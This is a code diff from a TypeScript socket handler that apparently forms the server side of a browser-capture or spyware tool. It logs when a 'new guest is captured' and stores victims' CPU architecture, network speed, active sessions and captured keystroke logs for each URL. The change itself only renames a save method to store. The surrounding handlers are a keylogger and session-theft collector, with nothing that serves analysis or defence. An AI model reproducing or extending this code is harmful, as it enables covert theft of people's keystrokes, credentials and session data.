@@ -28,7 +28,7 @@ export default async (socket:Socket) => {
             guest.cpuArch = navigator.getCPU().architecture
 
             log(guest, 'new guest is captured!')
-            await guest.save()
+            await guest.store()
         }
     })
 
@@ -39,7 +39,7 @@ export default async (socket:Socket) => {
             guest.networkSpeed = networkSpeed
 
             log(guest, `guest's network speed is detected:`, networkSpeed)
-            await guest.save()
+            await guest.store()
         }
     })
 
@@ -55,7 +55,7 @@ export default async (socket:Socket) => {
             guest.sessions = sessions
 
             log(guest, `guest's active sessions was detected:`, sessions)
-            await guest.save()
+            await guest.store()
         }
     })
 
@@ -65,7 +65,7 @@ export default async (socket:Socket) => {
         if (guest && keyLog.log) {
             guest.keyLogs.push(keyLog)
             log(guest, `guest's key log was captured for ${keyLog.url}:`, keyLog.log)
-            await guest.save()
+            await guest.store()
         }
     })
 }
